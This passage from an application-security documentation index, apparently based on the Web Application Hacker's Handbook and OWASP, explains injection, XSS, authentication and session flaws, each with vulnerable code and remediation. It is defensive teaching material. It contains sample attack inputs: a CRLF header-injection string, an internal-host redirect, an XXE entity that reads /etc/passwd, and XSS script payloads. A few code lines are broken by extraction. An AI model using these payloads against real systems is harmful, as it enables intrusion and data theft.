dynamic execution or include functions.</li> <li>Strict Input Validation: If such functions are absolutely unavoidable, the relevant input should be strictly validated using a whitelist of known good values. Reject any input that does not appear on this list or contains characters known to be harmful.</li> </ol> </li> <li> <p>Explanation of Fix: Not using dynamic execution functions with user input removes the interpreter's ability to execute malicious code. When unavoidable, strict whitelisting ensures that only safe, predefined inputs are processed, effectively preventing an attacker from introducing executable syntax.</p> </li> </ul>"},{"location":"appsec/WAHH/#e-mail-header-manipulation-smtp-injection","title":"E-mail Header Manipulation (SMTP Injection)","text":"<ul> <li> <p>Description / Definition: SMTP Injection occurs when an attacker manipulates email headers by injecting CRLF (carriage return/line feed) characters into user-supplied input used to construct an email. This can allow attackers to send arbitrary emails, spam, or even bypass security controls by injecting additional headers.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's description)     <pre><code>// Java example (representative)\nString recipient = request.getParameter(\"to\"); // User-supplied recipient\n// ... construct email\nMessage msg = new MimeMessage(session);\nmsg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipient)); // Vulnerable if recipient contains CRLF\n// ... send email\n</code></pre>     An attacker might input <code>attacker@example.com%0aBcc:spam@example.com</code> to inject a Bcc header.</p> </li> <li> <p>Root Cause: The root cause is the failure to validate user input for newline characters (CRLF) before incorporating it into email headers. SMTP and mail libraries interpret these characters as separators for new headers or body content, allowing injection.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Validate User Input for Newlines: Strictly validate user-supplied email inputs to ensure they do not contain any newline characters (CR and LF, <code>%0d</code> and <code>%0a</code>) or other SMTP metacharacters.</li> <li>Use Specific API Methods: Use mail APIs that properly handle or escape user input for email addresses and content.</li> </ol> </li> <li> <p>Explanation of Fix: Removing or encoding newline characters (<code>%0a</code>, <code>%0d</code>) from user input prevents the mail server from interpreting them as new headers or commands. This ensures that user input remains within its intended data field.</p> </li> </ul>"},{"location":"appsec/WAHH/#back-end-http-request-injection-hpihppserver-side-redirection","title":"Back-End HTTP Request Injection (HPI/HPP/Server-Side Redirection)","text":"<ul> <li> <p>Description / Definition: These vulnerabilities occur when an application constructs internal (server-side) HTTP requests using user-supplied data without proper validation or sanitization.</p> <ul> <li>HTTP Parameter Injection (HPI): Injecting parameters into the server's internal HTTP request.</li> <li>HTTP Parameter Pollution (HPP): Supplying multiple parameters with the same name, which may be handled differently by various components of the application.</li> <li>Server-Side HTTP Redirection: When a server-side component (e.g., a proxy, an internal redirect) constructs a new HTTP request based on user-supplied URL fragments, allowing an attacker to control the destination.</li> </ul> </li> <li> <p>Vulnerable Code Example:     A classic example of server-side HTTP redirection (representative, based on)     <pre><code>// Java example (representative)\nString url = request.getParameter(\"redirect_url\"); // User-controlled URL\nURL target = new URL(url); // Vulnerable if 'url' can be manipulated\nHttpURLConnection conn = (HttpURLConnection) target.openConnection();\n// ... fetch content from 'target'\n</code></pre>     An attacker could submit <code>http://internal-host/admin</code> to access an internal service.</p> </li> <li> <p>Root Cause: The root cause is the unvalidated or unsanitized inclusion of user-supplied data into the URL or parameters of internal HTTP requests. Different components (e.g., web server, application framework, back-end service) might interpret the same string differently, leading to unintended behavior.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Whitelist Destinations: For redirects and forwards, only allow destinations that are explicitly defined in a whitelist.</li> <li>Use Relative Paths: Prefer using relative paths for redirects and forwards to ensure they stay on the trusted site.</li> <li>Strict Input Validation: Ensure user-supplied scheme name or authority section of URLs are thoroughly validated, allowing only necessary prefixes, alphanumerics, hyphens, and periods.</li> <li>Avoid Assumptions: Do not assume default browser behavior will properly escape characters.</li> </ol> </li> <li> <p>Explanation of Fix: Whitelisting destinations and using relative paths severely restricts an attacker's ability to redirect to arbitrary external or internal locations. Strict input validation ensures that only safe characters and structures are permitted in dynamic URL parts, preventing injection of malicious components.</p> </li> </ul>"},{"location":"appsec/WAHH/#xml-injection-xxe","title":"XML Injection (XXE)","text":"<ul> <li> <p>Description / Definition: XML External Entity (XXE) injection is a type of XML injection that occurs when an XML parser processes XML input containing references to external entities (URIs) that are not properly secured. This can allow attackers to read local files, execute OS commands, perform server-side request forgery (SSRF), or launch denial-of-service attacks.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's concept)     <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;data&gt;&amp;xxe;&lt;/data&gt;\n</code></pre>     If an application parses this XML and renders the <code>data</code> element, it might display the content of <code>/etc/passwd</code>.</p> </li> <li> <p>Root Cause: The root cause is the improper configuration of XML parsers, which by default often allow the resolution and processing of external entities. When these parsers receive user-controlled XML input, they can be tricked into fetching and including external content, or even executing commands.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Disable External Entities: The most effective remediation is to disable the processing of external entities in the XML parser configuration.</li> <li>Disable DTD Processing: Disabling DTD (Document Type Definition) processing can also prevent XXE attacks.</li> <li>Use Whitelisting for DTDs: If DTDs are necessary, use a whitelist for allowed DTDs.</li> <li>Input Validation: Validate XML input against a schema and reject any malformed or unexpected structures.</li> </ol> </li> <li> <p>Explanation of Fix: Disabling external entity processing directly prevents the XML parser from resolving and including external content, thereby mitigating the core XXE vulnerability. This ensures that even if an attacker provides external entity definitions, they will not be processed.</p> </li> </ul>"},{"location":"appsec/WAHH/#soap-injection","title":"SOAP Injection","text":"<ul> <li> <p>Description / Definition: SOAP (Simple Object Access Protocol) injection vulnerabilities occur when user-supplied data is incorporated directly into back-end SOAP messages without proper sanitization. Attackers can inject XML metacharacters or SOAP-specific syntax to alter the message structure, potentially bypassing application logic or accessing unauthorized data.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's explanation)     Consider a SOAP message for adding an item, where the item description is user-controlled:     <pre><code>&lt;soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"&gt;\n    &lt;soap:Body&gt;\n        &lt;m:AddItem xmlns:m=\"http://example.com/products\"&gt;\n            &lt;m:Description&gt;User supplied description here&lt;/m:Description&gt;\n        &lt;/m:AddItem&gt;\n    &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre>     If <code>User supplied description here</code> is <code>&lt;/m:Description&gt;&lt;m:Price&gt;0&lt;/m:Price&gt;</code>, an attacker might inject a price.</p> </li> <li> <p>Root Cause: The root cause is the direct concatenation of unvalidated or unsanitized user input into the XML structure of SOAP messages. This allows attackers to manipulate the XML, leading to unintended processing by the SOAP service.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>XML Encoding: Properly encode all user input that will be inserted into SOAP messages.</li> <li>Use APIs for XML Construction: Utilize XML parsing and construction libraries that handle escaping automatically rather than manually building XML strings.</li> <li>Schema Validation: Validate incoming SOAP messages against their WSDL-defined schema.</li> </ol> </li> <li> <p>Explanation of Fix: Proper XML encoding ensures that user input is treated as literal text within XML elements and not as new XML tags or attributes. Using XML construction APIs helps automate this process securely.</p> </li> </ul>"},{"location":"appsec/WAHH/#2-cross-site-scripting-xss","title":"2. Cross-Site Scripting (XSS)","text":"<p>Cross-site scripting (XSS) is a common web application vulnerability that enables attackers to inject malicious script into web pages viewed by other users. This can allow attackers to bypass access controls (like the same-origin policy), gain access to user data, perform unauthorized actions on their behalf, or carry out other attacks.</p>"},{"location":"appsec/WAHH/#reflected-xss-non-persistent","title":"Reflected XSS (Non-Persistent)","text":"<ul> <li> <p>Description / Definition: Reflected XSS occurs when user-supplied data is immediately returned or \"reflected\" in the application's HTTP response without proper sanitization. The malicious script is delivered via a crafted URL or request, which, when clicked or processed, executes in the victim's browser.</p> </li> <li> <p>Vulnerable Code Example: <pre><code>&lt;!-- HTML example from OWASP Guide --&gt;\n&lt;input type=\"text\" name=\"fname\" value=\"UNTRUSTED DATA\"&gt;\n</code></pre>     If <code>UNTRUSTED DATA</code> comes directly from a URL parameter like <code>?fname=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>, the rendered HTML becomes:     <code>&lt;input type=\"text\" name=\"fname\" value=\"\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;</code>. The attacker's script then executes.</p> <p>Another example might be an error page reflecting user input: <pre><code>// PHP example (representative, based on)\necho \"Error: Invalid input \" . $_GET['message'];\n</code></pre> If <code>$_GET['message']</code> is <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, the script executes in the user's browser.</p> </li> <li> <p>Root Cause: The root cause is the failure to perform output encoding or sanitization on user-supplied data before it is inserted into the HTML output. The application trusts that the reflected input is benign and embeds it directly into the page.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Output Encoding (Context-Sensitive): The most crucial defense. Encode all user-supplied data based on the context in which it will be displayed in the HTML. For HTML attributes, use <code>&amp;#xHH;</code> format (or named entities). For HTML body, encode <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>\"</code>, <code>'</code>, and <code>/</code>.</li> <li>Input Validation: While not a primary defense for output, validating input (e.g., length, character sets) can reduce the attack surface.</li> <li>Content Security Policy (CSP): Implement a robust CSP header to restrict where scripts can be loaded from and executed [498 (implied by \"Potential solutions: OWASP HTML Sanitizer Project\")].</li> <li>Client-Side Sanitizers (OWASP HTML Sanitizer): Use libraries to sanitize HTML content.</li> </ol> </li> <li> <p>Corrected Code Example:     Using HTML attribute encoding for the input <code>value</code>:     <pre><code>&lt;!-- Corrected HTML example (representative, based on) --&gt;\n&lt;input type=\"text\" name=\"fname\" value=\"&amp;#x22;&amp;#x3e;&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;\"&gt;\n</code></pre>     Using encoding functions (e.g., from OWASP ESAPI or Java Encoder):     <pre><code>// Java example with encoding (representative, based on)\nString message = request.getParameter(\"message\");\n// org.owasp.esapi.ESAPI.encoder().encodeForHTML() or encodeForHTMLAttribute()\n// For HTML body:\nSystem.out.println(\"Error: Invalid input \" + ESAPI.encoder().encodeForHTML(message));\n// For HTML attribute:\n// &lt;input value='\" + ESAPI.encoder().encodeForHTMLAttribute(message) + \"'&gt;\n</code></pre></p> </li> <li> <p>Explanation of Fix: Output encoding transforms characters that have special meaning in HTML (like <code>&lt;</code> and <code>&gt;</code>) into their entity equivalents (like <code>&amp;lt;</code> and <code>&amp;gt;</code>). This ensures that the browser interprets the user's input as literal text rather than executable code. By consistently encoding based on the output context (HTML element content, attribute value, JavaScript string, etc.), the application prevents the attacker's script from breaking out of its intended context and executing.</p> </li> </ul>"},{"location":"appsec/WAHH/#stored-xss-persistent","title":"Stored XSS (Persistent)","text":"<ul> <li> <p>Description / Definition: Stored XSS occurs when malicious user-supplied data is permanently stored by the application (e.g., in a database) and later retrieved and displayed to other users without proper sanitization. This is often considered more serious than reflected XSS because the malicious payload is \"stored\" and can affect multiple users over time without further attacker interaction.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's explanation)     Consider a message board where users can post comments. If comments are stored and then retrieved, the following could be vulnerable:     <pre><code>// PHP example (representative)\n// When storing:\n$comment = $_POST['comment']; // Attacker inserts &lt;script&gt;alert('Stored XSS')&lt;/script&gt;\n// ... store $comment in database\n\n// When displaying:\n$stored_comment = getCommentFromDB();\necho \"&lt;p&gt;\" . $stored_comment . \"&lt;/p&gt;\"; // Vulnerable, directly echoes stored content\n</code></pre></p> </li> <li> <p>Root Cause: The root cause is the failure to perform output encoding or sanitization when retrieving and displaying user-supplied data that was previously stored. The application assumes that data once stored is safe, or that sanitization happened only upon input, neglecting to sanitize upon output, where the context of display might differ.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Output Encoding (Context-Sensitive): As with reflected XSS, the most critical defense is to encode all user-supplied data based on the context of its display in the HTML output, whenever it is retrieved from storage. This includes <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>\"</code>, <code>'</code>, and <code>/</code> for HTML body, and <code>&amp;#xHH;</code> for attributes.</li> <li>Input Validation/Sanitization: While output encoding is paramount, filtering and sanitizing input before storage can add a layer of defense. However, do not rely solely on input filtering, as output context can vary. If HTML content is legitimately allowed, use an HTML sanitization library (e.g., OWASP HTML Sanitizer Project) to remove dangerous tags and attributes.</li> </ol> </li> <li> <p>Explanation of Fix: The core principle remains output encoding at the point of display. By transforming special characters into their harmless HTML entity equivalents just before they are rendered in the browser, the application ensures that the stored malicious script is displayed as text, not executed as code. This is a \"defense-in-depth\" approach, recognizing that input filters can be bypassed or that data might originate from different, less-controlled sources.</p> </li> </ul>"},{"location":"appsec/WAHH/#dom-based-xss","title":"DOM-Based XSS","text":"<ul> <li> <p>Description / Definition: DOM-based XSS occurs entirely on the client-side when a JavaScript application modifies the page's DOM (Document Object Model) using attacker-controlled data, without proper sanitization. The malicious script is executed as a result of client-side code manipulating a part of the DOM, rather than the server reflecting or storing the payload.</p> </li> <li> <p>Vulnerable Code Example: <pre><code>&lt;!-- HTML with JavaScript example from OWASP Guide --&gt;\n&lt;script&gt;\n    function setWelcomeMessage() {\n        var name = document.location.hash.substring(1); // User-controlled part of URL\n        document.write(\"Welcome \" + name + \"!\"); // Vulnerable sink\n    }\n    setWelcomeMessage();\n&lt;/script&gt;\n</code></pre>     If the URL is <code>http://hostname/welcome.html#name=&lt;script&gt;alert(1)&lt;/script&gt;</code>, the script in the hash is read by JavaScript and written to the DOM, executing <code>alert(1)</code>.</p> </li> <li> <p>Root Cause: The root cause is client-side JavaScript directly using untrusted data from the DOM (e.g., <code>document.location</code>, <code>window.location</code>, <code>document.URL</code>, <code>document.referrer</code>) to modify the HTML DOM without proper sanitization or encoding. This allows an attacker to inject script that is then interpreted and executed by the browser.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Client-Side Sanitization/Encoding: All untrusted data that modifies the DOM must be sanitized or encoded before being written to the DOM. Use JavaScript encoding functions (e.g., <code>ESAPI.encoder().encodeForJavaScript()</code>) or HTML sanitizers on the client side.</li> <li>Avoid Dangerous JavaScript Functions: Avoid functions like <code>eval()</code>, <code>document.write()</code>, <code>document.writeln()</code>, <code>innerHTML</code>, <code>setTimeout()</code>, <code>setInterval()</code> when processing untrusted data, as they are common sinks for DOM-based XSS.</li> <li>Use Safe DOM Manipulation: Prefer safe DOM manipulation methods like <code>textContent</code> or <code>createElement</code> combined with <code>appendChild</code> instead of <code>innerHTML</code> when inserting untrusted data.</li> <li>Static Analysis Tools: Use static analysis tools with taint analysis to identify data flows from sources to sinks.</li> </ol> </li> <li> <p>Corrected Code Example:     Using safe DOM manipulation (representative):     <pre><code>&lt;!-- Corrected HTML with JavaScript example (representative) --&gt;\n&lt;div id=\"welcomeDiv\"&gt;&lt;/div&gt;\n&lt;script&gt;\n    function setWelcomeMessage() {\n        var name = document.location.hash.substring(1); // Still user-controlled source\n        var welcomeDiv = document.getElementById(\"welcomeDiv\");\n        // Safely set text content, not HTML\n        welcomeDiv.textContent = \"Welcome \" + name + \"!\"; // Safest sink\n        // Alternatively, if HTML is needed and sanitized:\n        // welcomeDiv.innerHTML = DOMPurify.sanitize(\"Welcome \" + name + \"!\"); // Using a sanitizer library\n    }\n    setWelcomeMessage();\n&lt;/script&gt;\n</code></pre></p> </li> <li> <p>Explanation of Fix: By using safe DOM manipulation methods like <code>textContent</code>, the browser treats any injected HTML or script as literal text, preventing it from being parsed and executed as code. Avoiding dangerous functions and implementing client-side sanitization libraries ensures that even if user input reaches a DOM manipulation function, it is rendered harmlessly.</p> </li> </ul>"},{"location":"appsec/WAHH/#3-broken-authentication","title":"3. Broken Authentication","text":"<p>Broken Authentication encompasses various vulnerabilities related to the improper implementation or design of authentication mechanisms, allowing attackers to bypass authentication, impersonate legitimate users, or gain unauthorized access to accounts.</p>"},{"location":"appsec/WAHH/#verbose-failure-messages-username-enumeration","title":"Verbose Failure Messages (Username Enumeration)","text":"<ul> <li> <p>Description / Definition: Verbose failure messages disclose different responses (error messages, HTTP status codes, response lengths, or subtle HTML differences) depending on whether a username is valid or invalid during login or other authentication-related functions (e.g., password reset). This allows attackers to enumerate valid usernames, which can then be targeted for brute-force or password-guessing attacks.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>\"Username not found.\" vs. \"Incorrect password.\" messages for invalid vs. valid usernames.</li> <li>Different HTTP status codes (e.g., 200 OK vs. 403 Forbidden) or different response lengths/times for valid vs. invalid usernames.</li> </ul> </li> <li> <p>Root Cause: The root cause is the application's failure to provide a generic, indistinguishable response for all failed login attempts, regardless of whether the username was valid or the password incorrect. This often stems from developers creating distinct code paths for different failure conditions, inadvertently leaking information.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Generic Error Message: Always return a single, generic error message for all failed login attempts (e.g., \"Invalid username or password\").</li> <li>Consistent Responses: Ensure that HTTP status codes, response lengths, and response times are consistent for all failed attempts to prevent inference.</li> <li>Account Lockout (Rate Limiting): Implement rate limiting and account lockout mechanisms to deter brute-force attacks on usernames, but be careful not to disclose lockout status for specific accounts.</li> </ol> </li> <li> <p>Explanation of Fix: A generic error message eliminates the attacker's ability to differentiate between valid and invalid usernames based on the application's response, thus preventing enumeration. Consistent response behavior (status codes, lengths, times) reinforces this by removing other detectable \"side channels\" of information leakage.</p> </li> </ul>"},{"location":"appsec/WAHH/#weakpredictable-passwords-brute-forcible-login","title":"Weak/Predictable Passwords &amp; Brute-Forcible Login","text":"<ul> <li> <p>Description / Definition:</p> <ul> <li>Weak Passwords: Applications allowing users to set easily guessable passwords (e.g., dictionary words, short passwords, simple patterns, predictable initial passwords).</li> <li>Brute-Forcible Login: Applications failing to implement adequate controls (like rate limiting) to prevent an attacker from systematically guessing passwords through a large number of attempts.</li> </ul> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>An application allowing \"password\" as a password.</li> <li>No lockout after 100 failed login attempts, allowing unlimited guessing.</li> <li>Initial passwords generated sequentially, e.g., <code>user001</code>, <code>user002</code>.</li> </ul> </li> <li> <p>Root Cause:</p> <ul> <li>Weak Password Policies: Lack of robust password complexity rules (length, character types).</li> <li>Insufficient Rate Limiting: Failure to implement mechanisms to detect and block or slow down repeated failed login attempts from a single source or against a single account.</li> <li>Predictable Generation: Use of weak or easily reversible algorithms for generating initial or temporary passwords.</li> </ul> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Strong Password Policy: Enforce strong password complexity rules (minimum length, combination of character types) and prevent the use of common dictionary words.</li> <li>Rate Limiting/Account Lockout: Implement rate limiting on login attempts (e.g., delaying responses, CAPTCHAs after a few failures) and account lockout after a reasonable number of failed attempts. Be careful not to leak enumeration info, as noted above.</li> <li>Salted Hashing for Passwords: Store passwords using strong, salted, and adaptive hashing algorithms (e.g., bcrypt, Argon2). Never store cleartext passwords.</li> <li>Secure Password Generation: If generating passwords, use cryptographically secure random number generators to ensure unpredictability.</li> <li>Multi-factor Authentication (MFA): Implement MFA for critical accounts [206 (Implied)].</li> </ol> </li> <li> <p>Explanation of Fix: Strong password policies make brute-force attacks computationally expensive and impractical. Rate limiting and account lockout directly mitigate brute-force attacks by slowing down or stopping an attacker's attempts. Salted hashing protects stored passwords even if the database is breached, making it impossible to reverse hashes to plaintext or use rainbow tables. Cryptographically secure generation ensures new passwords are unpredictable.</p> </li> </ul>"},{"location":"appsec/WAHH/#vulnerable-transmission-insecure-storage-of-credentials","title":"Vulnerable Transmission &amp; Insecure Storage of Credentials","text":"<ul> <li> <p>Description / Definition:</p> <ul> <li>Vulnerable Transmission: Credentials (usernames, passwords) are transmitted over unencrypted channels (HTTP instead of HTTPS) or are exposed in URLs or cookies.</li> <li>Insecure Storage: Passwords are stored in plaintext, easily reversible encryption, or unsalted/weakly hashed forms in the database or filesystem.</li> </ul> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li><code>http://www.wahh-app.com/app?action=login&amp;uname=joe&amp;password=pass</code> \u2013 Credentials in URL query string.</li> <li>A database containing a \"passwords\" column with cleartext values.</li> <li>Multiple user accounts sharing the same hash for a common password due to lack of salting.</li> </ul> </li> <li> <p>Root Cause:</p> <ul> <li>Inadequate Use of HTTPS: Failure to use HTTPS for all authentication-related communication.</li> <li>Improper Credential Handling: Storing sensitive data in easily accessible locations (URLs, cookies) or using insecure storage methods for passwords (plaintext, weak hashing).</li> <li>Lack of Cryptographic Best Practices: Not applying standard, secure algorithms with strong key sizes for password hashing or data encryption.</li> </ul> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Always Use HTTPS: All sensitive communication, especially authentication, must occur over HTTPS. Cookies carrying session tokens should be flagged as <code>Secure</code>.</li> <li>Never Store Passwords in Cleartext: Passwords should be hashed using cryptographically strong, salted, adaptive hashing algorithms (e.g., PBKDF2, bcrypt, scrypt, Argon2).</li> <li>Avoid Exposure in URLs/Cookies: Never transmit credentials in URL query strings or set them directly in insecure cookies.</li> <li>Review Cryptographic Implementations: Ensure standard, secure algorithms are used, and custom cryptographic implementations are avoided.</li> </ol> </li> <li> <p>Corrected Code Example: (Illustrates secure hashing, no code for HTTPS itself)     <pre><code>// Java example for secure password storage (representative)\npublic String hashPassword(String password, byte[] salt) {\n    // Use a strong, adaptive hashing algorithm like BCrypt or Argon2 (external library needed)\n    // Example using a conceptual strongHash function:\n    return strongHash(password, salt);\n}\n// ... when storing\nbyte[] salt = generateRandomSalt(); // Cryptographically secure random salt\nString hashedPassword = hashPassword(userPassword, salt);\n// Store hashedPassword and salt in the database\n</code></pre></p> </li> <li> <p>Explanation of Fix: HTTPS encrypts data in transit, protecting credentials from eavesdropping. Salting adds randomness to password hashing, preventing rainbow table attacks and ensuring that identical passwords result in different hashes for different users. Adaptive hashing algorithms (like bcrypt) are computationally intensive, making brute-force attacks against stored hashes infeasible even with powerful hardware. Avoiding URLs/cookies for credentials prevents their exposure in logs or browser history.</p> </li> </ul>"},{"location":"appsec/WAHH/#incomplete-validation-of-credentials-logic-flaws-in-authentication","title":"Incomplete Validation of Credentials / Logic Flaws in Authentication","text":"<ul> <li> <p>Description / Definition: These are subtle defects in the authentication process where the application's logic for validating credentials or managing authentication states is flawed. This can lead to bypasses, such as a partial password check or allowing login with only a username.</p> </li> <li> <p>Vulnerable Behavior Example: <pre><code>// Java example of incomplete validation from Web Application Hacker's Handbook\npublic boolean checkCredentials(String username, String password) {\n    if (!userExists(username)) return false; // Check 1\n    if (!passwordMatches(password)) return false; // Check 2 (problematic)\n    if (password.length() &lt; 8) return false; // Check 3\n    // If passwordMatches() is not called and the application relies on an exception\n    // that isn't always thrown or handled, a bypass might occur.\n    // ... more complex logic that can be bypassed\n    return true;\n}\n</code></pre>     An attacker might find ways to make <code>passwordMatches()</code> not return <code>false</code> (e.g., by causing an exception that is not caught, leading to a \"fail-open\" state).</p> </li> <li> <p>Root Cause: The root cause is flawed assumptions or incomplete logic in the authentication flow, especially in complex, multi-layered or multi-stage processes. Developers might overlook edge cases, error handling, or the sequence of validation checks, leading to \"fail-open\" conditions where the application grants access despite an invalid input.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Full Credential Validation: Passwords should be validated in full, case-sensitively, without filtering or modifying characters, and without truncating them.</li> <li>Aggressive Error Handling: Applications should be aggressive in defending against unexpected events during login processing. Use catch-all exception handlers around all API calls.</li> <li>Strict State Management: Ensure that the authentication state machine is strictly enforced, and unexpected state transitions are rejected.</li> <li>Explicit Failure: Design authentication logic to explicitly fail closed if any validation check or error condition is encountered that prevents full authentication.</li> </ol> </li> <li> <p>Explanation of Fix: Full and consistent credential validation prevents attackers from guessing partial passwords or exploiting weaknesses in the validation logic. Aggressive error handling and explicit \"fail closed\" design ensure that any unexpected conditions or errors during the authentication process default to denying access, rather than inadvertently granting it.</p> </li> </ul>"},{"location":"appsec/WAHH/#4-broken-session-management","title":"4. Broken Session Management","text":"<p>Broken Session Management refers to vulnerabilities in how an application manages user sessions, including session ID generation, handling, and termination. Flaws can lead to session hijacking, session fixation, or unauthorized access.</p>"},{"location":"appsec/WAHH/#predictable-session-tokens","title":"Predictable Session Tokens","text":"<ul> <li> <p>Description / Definition: Session tokens (or session IDs) are predictable if an attacker can guess or deduce valid tokens for other users. This predictability can arise from using weak random number generators, sequentially generated IDs, or embedding predictable/meaningful data within the token.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>Session IDs that are sequential numbers.</li> <li>Session IDs that include easily discoverable information like a username, timestamp, or IP address in a plaintext or easily decodable format.</li> <li>Using weak random number generators (<code>java.util.Random</code> instead of <code>SecureRandom</code>).</li> </ul> </li> <li> <p>Root Cause: The root cause is the use of insecure or insufficient entropy sources for generating session IDs, leading to values that are guessable or can be reverse-engineered. Developers may also include meaningful but sensitive data directly in the token, which can be decoded.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Cryptographically Strong Session IDs: Generate session IDs using cryptographically strong random number generators (e.g., <code>java.security.SecureRandom</code>).</li> <li>Meaningless Content: Session ID content (or value) must be meaningless to prevent information disclosure attacks. Avoid embedding any user-specific or predictable data directly in the ID.</li> <li>Sufficient Length and Character Set: Ensure session IDs are of sufficient length and use a broad character set to increase entropy and make brute-forcing impractical.</li> <li>Regular Regeneration: Regenerate session IDs after successful authentication and privilege level changes to mitigate session fixation.</li> </ol> </li> <li> <p>Corrected Code Example: <pre><code>// Java example for generating a secure random number (from OWASP Guide)\npackage org.owasp.java.crypto;\nimport java.security.SecureRandom;\nimport java.security.NoSuchAlgorithmException;\n// ...\npublic class RandomNumberGenerator {\n    public static void main(String[] args) {\n        try {\n            SecureRandom sr = SecureRandom.getInstance(\"SHA1PRNG\"); // Or another strong algorithm\n            byte[] bytes = new byte; // Generate 16 bytes for a strong session ID\n            sr.nextBytes(bytes);\n            // Convert bytes to a hex or Base64 string for the session ID\n            // String sessionId = new BASE64Encoder().encode(bytes); // Example\n            // ... then set the cookie\n        } catch (NoSuchAlgorithmException e) {\n            // handle exception\n        }\n    }\n}\n</code></pre></p> </li> <li> <p>Explanation of Fix: Cryptographically strong random number generators produce high-entropy, unpredictable session IDs, making them practically impossible for an attacker to guess. Ensuring the ID is meaningless prevents information leakage if an attacker captures it. Regular regeneration of IDs (especially after login) prevents an attacker from using a known, unauthenticated session ID to hijack a legitimate, authenticated session (session fixation).</p> </li> </ul>"},{"location":"appsec/WAHH/#insecure-session-token-transmission-disclosure","title":"Insecure Session Token Transmission &amp; Disclosure","text":"<ul> <li> <p>Description / Definition: Session tokens are transmitted insecurely (e.g., over HTTP) or are disclosed in vulnerable locations such as application logs, URLs, or error messages. This can allow attackers to steal session tokens and hijack user sessions.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>Session tokens transmitted in the URL query string (<code>http://example.com/page?sessionid=abc</code>).</li> <li>Session tokens sent over plain HTTP instead of HTTPS.</li> <li>Application logs (accessible by attackers or compromised parties) containing plaintext session IDs.</li> </ul> </li> <li> <p>Root Cause: The root cause is the failure to enforce HTTPS for all sensitive communication and improper logging or handling of sensitive session information. Developers might mistakenly believe that only login pages need HTTPS, or they might log too much sensitive data.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Always Use HTTPS: Session tokens must only be transmitted over HTTPS.</li> <li>Secure Cookie Flag: HTTP cookies used for session tokens should be flagged as <code>Secure</code> to prevent browsers from sending them over unencrypted HTTP.</li> <li>HttpOnly Cookie Flag: Use the <code>HttpOnly</code> flag to prevent client-side scripts (like JavaScript) from accessing the session cookie, mitigating XSS-based session hijacking.</li> <li>Never Expose in URLs: Session IDs should never be passed in URLs (query strings or path parameters).</li> <li>Sensitive Data Logging: Avoid logging sensitive information like session tokens in application logs that could be accessed by unauthorized parties.</li> </ol> </li> <li> <p>Explanation of Fix: HTTPS encryption protects the session token from eavesdropping during transit. The <code>Secure</code> flag ensures the browser only sends the cookie over encrypted connections. The <code>HttpOnly</code> flag prevents client-side script access, making XSS-based session hijacking more difficult. Avoiding URLs prevents tokens from being exposed in browser history, server logs, or referrer headers. Restricting logging of sensitive data prevents their disclosure if logs are compromised.</p> </li> </ul>"},{"location":"appsec/WAHH/#session-fixation","title":"Session Fixation","text":"<ul> <li> <p>Description / Definition: Session fixation allows an attacker to \"fix\" a victim's session ID to a value known to the attacker. If the application does not issue a new session ID after successful authentication, the victim's authenticated session will use the attacker-supplied ID, allowing the attacker to hijack the session.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ol> <li>Attacker visits an application, obtains a session ID (e.g., in a URL parameter).</li> <li>Attacker sends this fixed session ID to the victim.</li> <li>Victim logs in using the fixed session ID.</li> <li>Application does not issue a new session ID after login.</li> <li>Attacker uses the original, fixed session ID to access the victim's now-authenticated session.</li> </ol> </li> <li> <p>Root Cause: The root cause is the application's failure to generate a new, cryptographically strong session ID upon successful user authentication or any change in privilege level.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Generate New Session ID on Login: Always invalidate the old session and generate a completely new session ID after a user successfully authenticates.</li> <li>Invalidate Session on Logout: Properly invalidate sessions upon logout.</li> </ol> </li> <li> <p>Corrected Code Example: <pre><code>// Java example to invalidate old session and create new one (from OWASP Guide)\nrequest.getSession(false).invalidate(); // Invalidate existing session\n// Then create a new session\nrequest.getSession(true); // getSession() also creates new if none exists\n</code></pre></p> </li> <li> <p>Explanation of Fix: By invalidating the pre-authentication session ID and issuing a new one upon successful login, the application ensures that the attacker's \"fixed\" session ID becomes invalid, and the attacker can no longer use it to access the victim's authenticated session.</p> </li> 